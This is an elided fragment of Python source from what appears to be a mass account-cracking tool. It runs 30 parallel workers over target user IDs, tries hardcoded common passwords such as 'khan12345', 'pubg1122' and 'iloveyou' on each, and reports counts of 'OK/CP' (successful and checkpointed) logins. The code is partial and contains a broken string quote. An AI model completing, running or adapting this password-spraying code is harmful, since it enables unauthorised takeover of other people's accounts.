...
def pak():
		...
		with tred(max_workers=30) as SK:	
			...
			for psx in user:
				...
				if pcs in ['2','02']:
					passlist = [psx,ids,'Sabbir1234','khan1122','ali12345','ilovema','khan12345','ali1122','baloch12345','khan','baloch','khan','pubg','pubg1122','malik786']
				elif pcs in ['3','03']:
					...
					passlist = [psx,ids,'Sabbir','bangladesh','i love you','iloveyou','free fire','freefire']
				elif pcs in ['8','08']:
		...
		print('\033[1;37m')
		linex()
		print(' THE PROCESS  HAS COMPLETD`)
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
		linex()
		input(' Press enter to back ')
		os.system('python trt.py')
